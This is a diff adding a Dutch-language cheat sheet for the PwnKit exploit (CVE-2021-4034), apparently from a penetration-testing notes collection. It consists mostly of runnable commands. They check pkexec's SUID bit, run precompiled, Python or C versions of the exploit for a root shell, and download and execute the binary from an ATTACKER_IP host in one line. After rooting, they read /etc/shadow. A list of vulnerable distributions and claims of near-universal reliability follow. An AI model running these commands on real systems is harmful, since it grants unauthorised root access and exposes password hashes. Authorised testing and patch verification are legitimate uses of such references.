@@ -1,0 +1,52 @@
+# PwnKit — Linux LPE via pkexec (CVE-2021-4034)
+# Exploiteert memory corruption in polkit's pkexec SUID binary voor root toegang
+#
+# === Syntax ===
+# chmod +x PwnKit && ./PwnKit
+#
+# === Vereisten ===
+# Geen argumenten nodig
+# pkexec moet SUID hebben (standaard op vrijwel alle Linux distro's)
+# polkit versie < 0.120 (kwetsbaar)
+# Controleer: ls -la $(which pkexec)
+#
+# === Voorbeelden ===
+
+# Controleer of pkexec SUID is
+ls -la $(which pkexec)
+# Verwacht: -rwsr-xr-x root root ... /usr/bin/pkexec
+
+# Controleer polkit versie
+pkexec --version
+
+# Exploit uitvoeren (pre-compiled binary)
+chmod +x PwnKit
+./PwnKit
+# Geeft direct een root shell
+
+# Alternatief: Python versie
+python3 CVE-2021-4034.py
+
+# Alternatief: C source compileren op target
+gcc pwnkit.c -o pwnkit
+chmod +x pwnkit
+./pwnkit
+
+# Download en uitvoeren in één stap
+curl http://ATTACKER_IP/tools/PwnKit -o /tmp/PwnKit && chmod +x /tmp/PwnKit && /tmp/PwnKit
+
+# Na root shell: bewijs verzamelen
+id
+cat /etc/shadow
+hostname
+
+# === Kwetsbare distro's (ongepatchte versies) ===
+# Ubuntu 10.04 - 21.10
+# Debian 7 - 11
+# CentOS 6 - 8 / RHEL 6 - 8
+# Fedora 23 - 35
+# En vrijwel elke distro met polkit < 0.120
+
+# NOTE: Zeer betrouwbaar — werkt op bijna elk ongepatchte Linux systeem
+# NOTE: Geen user interactie of speciale privileges nodig
+# NOTE: Gepatcht in januari 2022 — controleer patchniveau
